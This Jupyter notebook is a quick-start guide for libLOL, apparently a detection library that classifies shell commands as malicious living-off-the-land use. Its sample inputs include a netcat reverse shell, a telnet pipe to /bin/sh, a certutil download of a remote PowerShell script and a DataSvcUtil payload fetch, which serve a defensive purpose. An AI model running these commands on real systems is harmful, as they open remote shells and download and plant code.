{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Quick start guide for libLOL\n",
    "\n",
    "This demo will only show you how to get LOL up and running using pip installation and how to use the library on some sample data.\n",
    "\n",
    "This is sufficient for most users. However, if you want to build your own custom model we suggest you take a look at the other examples in this folder."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Installation via pip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install lolc"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Linux example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "nc -nlvp 1234 & nc -e /bin/bash 10.20.30.40 4321\n",
      "BAD\n",
      "IP_PRIVATE PATH_/BIN/BASH COMMAND_NC KEYWORD_-NLVP KEYWORD_-E nc_listener_to_shell LOOKS_LIKE_KNOWN_LOL\n",
      "\n",
      "iptables -t nat -L -n\n",
      "GOOD\n",
      "COMMAND_IPTABLES KEYWORD_-T KEYWORD_-L KEYWORD_-N iptables_list\n",
      "\n",
      "telnet 10.20.30.40 5000 | /bin/sh | 10.20.30.50 5001\n",
      "BAD\n",
      "IP_PRIVATE PATH_/BIN/SH COMMAND_TELNET telnet_sh LOOKS_LIKE_KNOWN_LOL\n",
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[Parallel(n_jobs=16)]: Using backend ThreadingBackend with 16 concurrent workers.\n",
      "[Parallel(n_jobs=16)]: Done   9 tasks      | elapsed:    0.0s\n",
      "[Parallel(n_jobs=16)]: Done  45 out of  50 | elapsed:    0.0s remaining:    0.0s\n",
      "[Parallel(n_jobs=16)]: Done  50 out of  50 | elapsed:    0.0s finished\n"
     ]
    }
   ],
   "source": [
    "from lol.api import LOLC, PlatformType\n",
    "lolc=LOLC(PlatformType.LINUX) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS\n",
    "commands=['nc -nlvp 1234 & nc -e /bin/bash 10.20.30.40 4321',\n",
    "          'iptables -t nat -L -n',\n",
    "          'telnet 10.20.30.40 5000 | /bin/sh | 10.20.30.50 5001']\n",
    "classification, tags = lolc(commands)\n",
    "for command, status, tag in zip (commands, classification, tags):\n",
    "    print(command)\n",
    "    print(status)\n",
    "    print(tag)\n",
    "    print(\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Windows example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt\n",
      "BAD\n",
      "COMMAND_CERTUTIL.EXE KEYWORD_dash_urlcache KEYWORD_dash_f KEYWORD_http certutil_downloader powershell_file\n",
      "\n",
      "explorer.exe c:\\temp\n",
      "NEUTRAL\n",
      "\n",
      "\n",
      "DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile\n",
      "BAD\n",
      "IP_PUBLIC COMMAND_DATASVCUTIL DataSvcUtil_http KEYWORD_http\n",
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[Parallel(n_jobs=16)]: Using backend ThreadingBackend with 16 concurrent workers.\n",
      "[Parallel(n_jobs=16)]: Done   9 tasks      | elapsed:    0.0s\n",
      "[Parallel(n_jobs=16)]: Done  45 out of  50 | elapsed:    0.0s remaining:    0.0s\n",
      "[Parallel(n_jobs=16)]: Done  50 out of  50 | elapsed:    0.0s finished\n"
     ]
    }
   ],
   "source": [
    "from lol.api import LOLC, PlatformType\n",
    "lolc=LOLC(PlatformType.WINDOWS) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS\n",
    "commands=['certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\\\temp:ttt',\n",
    "          'explorer.exe c:\\\\temp',\n",
    "          'DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile']\n",
    "classification, tags = lolc(commands)\n",
    "for command, status, tag in zip (commands, classification, tags):\n",
    "    print(command)\n",
    "    print(status)\n",
    "    print(tag)\n",
    "    print(\"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
